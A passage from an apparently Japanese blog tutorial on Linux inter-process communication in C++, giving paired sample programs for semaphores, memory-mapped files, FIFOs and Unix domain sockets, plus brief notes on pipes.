    <span class="cm">/* セマフォの初期化 */</span>
    <span class="k">union</span> <span class="n">semun</span> <span class="n">argument</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">values</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">values</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">argument</span><span class="p">.</span><span class="n">array</span> <span class="o">=</span> <span class="n">values</span><span class="p">;</span>
    <span class="n">semctl</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SETALL</span><span class="p">,</span> <span class="n">argument</span><span class="p">);</span>

    <span class="cm">/* プロセスBの実行を待つ */</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Waiting for post operation..."</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">sembuf</span> <span class="n">operations</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_op</span> <span class="o">=</span> <span class="n">WAIT</span><span class="p">;</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_flg</span> <span class="o">=</span> <span class="n">SEM_UNDO</span><span class="p">;</span>
    <span class="n">semop</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span> <span class="n">operations</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="cm">/* セマフォの解放 */</span>
    <span class="k">auto</span> <span class="n">result</span> <span class="o">=</span> <span class="n">semctl</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">IPC_RMID</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">result</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Failed to close semaphore"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_b.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;sys/ipc.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/sem.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>

<span class="k">union</span> <span class="n">semun</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">val</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">semid_ds</span> <span class="o">*</span><span class="n">buf</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span> <span class="o">*</span><span class="n">array</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">seminfo</span> <span class="o">*</span><span class="n">__buf</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">enum</span> <span class="n">SEMAPHORE_OPERATION</span>
<span class="p">{</span>
    <span class="n">UNLOCK</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span>
    <span class="n">WAIT</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
    <span class="n">LOCK</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* セマフォの確保 */</span>
    <span class="k">const</span> <span class="kt">key_t</span> <span class="n">key</span> <span class="o">=</span> <span class="mi">112</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">sem_flags</span> <span class="o">=</span> <span class="mo">0666</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">sem_id</span> <span class="o">=</span> <span class="n">semget</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">sem_flags</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span> <span class="o">==</span> <span class="n">sem_id</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">std</span><span class="o">::</span><span class="n">cerr</span> <span class="o">&lt;&lt;</span> <span class="s">"Failed to acquire semapore"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">"Unlock semaphore"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>

    <span class="cm">/* セマフォにポスト */</span>
    <span class="n">sembuf</span> <span class="n">operations</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_num</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_op</span> <span class="o">=</span> <span class="n">UNLOCK</span><span class="p">;</span>
    <span class="n">operations</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">sem_flg</span> <span class="o">=</span> <span class="n">SEM_UNDO</span><span class="p">;</span>
    <span class="n">semop</span><span class="p">(</span><span class="n">sem_id</span><span class="p">,</span> <span class="n">operations</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="マップドメモリー" class="fragment"></span><a href="#%E3%83%9E%E3%83%83%E3%83%97%E3%83%89%E3%83%A1%E3%83%A2%E3%83%AA%E3%83%BC"><i class="fa fa-link"></i></a>マップドメモリー</h1>

<p>複数のプロセスがファイルを介して通信します。<br>
ファイルのアクセスの時にメモリマッピングを行い処理を高速化させます。<br>
メモリマッピングとはファイルやデバイスなどをあたかもメモリのようにアクセスできるよう仮想アドレス空間にマップすることを指します。<br>
これにより、シリアライズなしでファイルにデータを配置することができます。</p>

<p>それでは、メモリマップを使ったプロセス間通信のサンプルコードを以下に示します。</p>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_a.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">FILE_LENGTH</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">FILE_NAME</span><span class="p">(</span><span class="s">"./data.dat"</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* Prepare a file large enough to hold an unsigned integer. */</span>
    <span class="k">auto</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE_NAME</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_CREAT</span><span class="p">,</span> <span class="n">S_IRUSR</span> <span class="o">|</span> <span class="n">S_IWUSR</span><span class="p">);</span>
    <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">FILE_LENGTH</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
    <span class="cm">/* Create the memory mapping. */</span>
    <span class="kt">char</span><span class="o">*</span> <span class="k">const</span> <span class="n">file_memory</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">FILE_LENGTH</span><span class="p">,</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="cm">/* Write a random integer to memory-mapped area. */</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">file_memory</span><span class="p">,</span> <span class="s">"%s"</span><span class="p">,</span> <span class="s">"Hello World!"</span><span class="p">);</span>
    <span class="cm">/* Release the memory (unnecessary because the program exits). */</span>
    <span class="n">munmap</span> <span class="p">(</span><span class="n">file_memory</span><span class="p">,</span> <span class="n">FILE_LENGTH</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_b.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="k">const</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">FILE_LENGTH</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
<span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">FILE_NAME</span><span class="p">(</span><span class="s">"./data.dat"</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="cm">/* Open the file. */</span>
    <span class="k">auto</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE_NAME</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">O_RDWR</span><span class="p">,</span> <span class="n">S_IRUSR</span> <span class="o">|</span> <span class="n">S_IWUSR</span><span class="p">);</span>
    <span class="cm">/* Create the memory mapping. */</span>
    <span class="kt">char</span><span class="o">*</span> <span class="k">const</span> <span class="n">file_memory</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">FILE_LENGTH</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">));</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="cm">/* Read the integer, print it out, and double it. */</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">file_memory</span><span class="p">);</span>

    <span class="cm">/* Release the memory (unnecessary because the program exits). */</span>
    <span class="n">munmap</span><span class="p">(</span><span class="n">file_memory</span><span class="p">,</span> <span class="n">FILE_LENGTH</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="パイプ" class="fragment"></span><a href="#%E3%83%91%E3%82%A4%E3%83%97"><i class="fa fa-link"></i></a>パイプ</h1>

<p>パイプは親子関係にあるプロセス間の一方向の通信を実現します。<br>
コマンドラインでお馴染みでしょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ ps aux | grep apache
</pre></div></div>

<p><code>ps aux</code>の実行結果をパイプ<code>|</code>を通じて<code>grep</code>コマンドで渡されます。<br>
しかし、このパイプ厄介なのがプロセス間に親子関係が必要になるということです。<br>
process_aプログラムがprocess_bプログラムを起動してパイプを通じてデータの交換を行うサンプルプログラムを作成しようとしましたが、うまく行きませんでした。<br>
できる方がいらっしゃいましたらコメント欄でお知らせください。</p>

<h1>
<span id="fifo" class="fragment"></span><a href="#fifo"><i class="fa fa-link"></i></a>FIFO</h1>

<p>別名named pipedと呼ばれています。ファイルシステム上で名前を持つパイプです。<br>
親子関係がなくても全てのプロセスがFIFOを作成、アクセス、削除することができます。<br>
このFIFOは<code>mkfifo</code>コマンドでコンソールから作成することもできます。</p>

<div class="code-frame" data-lang="console"><div class="highlight"><pre><span></span><span class="gp">$</span> mkfifo ./fifo.tmp
</pre></div></div>

<p>作成されたFIFOは普通のファイルのようにアクセスすることができます。</p>

<div class="code-frame" data-lang="console">
<div class="code-lang"><span class="bold">FIFOに書き込み</span></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat &gt; fifo.tmp
</pre></div>
</div>

<div class="code-frame" data-lang="console">
<div class="code-lang"><span class="bold">FIFOを読み込み</span></div>
<div class="highlight"><pre><span></span><span class="gp">$</span> cat fifo.tmp
</pre></div>
</div>

<p>以下、FIFOでデータを交換するサンプルコードです。</p>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_a.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="k">const</span> <span class="kt">size_t</span> <span class="nf">BUFFER_SIZE</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// ファイルディスクリプタ</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

    <span class="c1">// FIFOの作成</span>
    <span class="c1">// mkfifo(&lt;pathname&gt;, &lt;permission&gt;)</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/tmp/myfifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>

    <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">message</span><span class="p">(</span><span class="s">"Hello World!"</span><span class="p">);</span>
    <span class="c1">// 書き込み専用でFIFOを開く</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/myfifo"</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="p">);</span>

    <span class="c1">// メッセージの書き込み</span>
    <span class="n">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">message</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">message</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_b.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="k">const</span> <span class="kt">size_t</span> <span class="nf">BUFFER_SIZE</span><span class="p">(</span><span class="mi">80</span><span class="p">);</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="c1">// ファイルディスクリプタ</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>

    <span class="c1">// FIFOの作成</span>
    <span class="c1">// mkfifo(&lt;pathname&gt;, &lt;permission&gt;)</span>
    <span class="n">mkfifo</span><span class="p">(</span><span class="s">"/tmp/myfifo"</span><span class="p">,</span> <span class="mo">0666</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="n">BUFFER_SIZE</span><span class="p">];</span>
    <span class="c1">// 読み込み専用でFIFOを開く</span>
    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/tmp/myfifo"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">str</span><span class="p">,</span> <span class="n">BUFFER_SIZE</span><span class="p">);</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">message</span><span class="p">(</span><span class="n">str</span><span class="p">);</span>

    <span class="c1">// 読み込んだ内容の表示</span>
    <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">message</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<p>FIFOは複数のプロセスから読み書きできます。複数同時のアクセスは自動的に排他処理されます。</p>

<h1>
<span id="ソケット通信" class="fragment"></span><a href="#%E3%82%BD%E3%82%B1%E3%83%83%E3%83%88%E9%80%9A%E4%BF%A1"><i class="fa fa-link"></i></a>ソケット通信</h1>

<p>ソケットは依存関係のないプロセス間での通信を実現します。<br>
加えて、他の方法にはないメリットがあります。それは、他のマシンにあるプロセスと通信できることです。<br>
以下が、ソケットを使用したサンプルコードです。</p>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_a.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cassert&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/un.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">server</span> <span class="p">(</span><span class="k">const</span> <span class="kt">int</span><span class="o">&amp;</span> <span class="n">client_socket</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">const</span> <span class="kt">size_t</span> <span class="n">MAX_SIZE</span> <span class="o">=</span> <span class="mi">128</span><span class="p">;</span>
        <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="n">MAX_SIZE</span><span class="p">];</span>
        <span class="n">read</span><span class="p">(</span><span class="n">client_socket</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">MAX_SIZE</span><span class="p">);</span>
        <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">message</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="n">message</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">std</span><span class="o">::</span><span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="n">message</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">;</span>
            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="s">"This line must not be executed."</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">socket_name</span><span class="p">(</span><span class="s">"my_socket"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">socket_fd</span><span class="p">;</span>
    <span class="n">sockaddr_un</span> <span class="n">name</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">client_sent_quit_message</span><span class="p">;</span>
    <span class="cm">/* ソケットを作成 */</span>
    <span class="n">socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_LOCAL</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="cm">/* サーバーとして設定 */</span>
    <span class="n">name</span><span class="p">.</span><span class="n">sun_family</span> <span class="o">=</span> <span class="n">AF_LOCAL</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="n">sun_path</span><span class="p">,</span> <span class="n">socket_name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
    <span class="n">bind</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">sockaddr</span><span class="o">*&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">),</span> <span class="n">SUN_LEN</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">name</span><span class="p">));</span>
    <span class="cm">/* ソケットを開く */</span>
    <span class="n">listen</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
    <span class="cm">/* 接続されたらメッセージが届くまで待機 */</span>
    <span class="k">do</span> <span class="p">{</span>
        <span class="n">sockaddr_un</span> <span class="n">client_name</span><span class="p">;</span>
        <span class="kt">socklen_t</span> <span class="n">client_name_len</span><span class="p">;</span>
        <span class="kt">int</span> <span class="n">client_socket_fd</span><span class="p">;</span>
        <span class="cm">/* 接続があるまで待機 */</span>
        <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">sockaddr</span><span class="o">*&gt;</span><span class="p">(</span><span class="o">&amp;</span><span class="n">client_name</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">client_name_len</span><span class="p">);</span>
        <span class="cm">/* メッソージを受け取る */</span>
        <span class="n">client_sent_quit_message</span> <span class="o">=</span> <span class="n">server</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">);</span>
        <span class="cm">/* 切断する*/</span>
        <span class="n">close</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">);</span>
    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="o">!</span><span class="n">client_sent_quit_message</span><span class="p">);</span>
    <span class="cm">/* ソケットを閉じる */</span>
    <span class="n">close</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">);</span>
    <span class="n">unlink</span><span class="p">(</span><span class="n">socket_name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>

    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="c++">
<div class="code-lang"><span class="bold">process_b.cpp</span></div>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="cpf">&lt;iostream&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdio&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;cstdlib&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;string&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;sys/un.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>

<span class="cm">/* Write TEXT to the socket given by file descriptor SOCKET_FD. */</span>
<span class="kt">int</span> <span class="nf">write_text</span><span class="p">(</span><span class="k">const</span> <span class="kt">int</span><span class="o">&amp;</span> <span class="n">socket_fd</span><span class="p">,</span> <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="o">&amp;</span> <span class="n">message</span><span class="p">)</span>
<span class="p">{</span>
    <span class="cm">/* Write the string. */</span>
    <span class="n">write</span><span class="p">(</span><span class="n">socket_fd</span><span class="p">,</span> <span class="n">message</span><span class="p">.</span><span class="n">c_str</span><span class="p">(),</span> <span class="n">message</span><span class="p">.</span><span class="n">size</span><span class="p">()</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">()</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">socket_name</span><span class="p">(</span><span class="s">"my_socket"</span><span class="p">);</span>
    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">message</span> <span class="o">=</span> <span class="s">"Hello World!!"</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">socket_fd</span><span class="p">;</span>
    <span class="n">sockaddr_un</span> <span class="n">name</span><span class="p">;</span>
    <span class="cm">/* ソケットを作成する */</span>
    <span class="n">socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">PF_LOCAL</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="cm">/* ソケット名を設定 */</span>
    <span class="n">name</span><span class="p">.</span><span class="n">sun_family</span> <span class="o">=</span> <span class="n">AF_LOCAL</span><span class="p">;</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">name</span><span class="p">.</span><span class="n">sun_path</span><span class="p">,</span> <span class="n">socket_name</span><span class="p">.</span><span class="n">c_str</span><span class="p">());</span>
    <span class="cm">/* ソケットを接続 */</span>
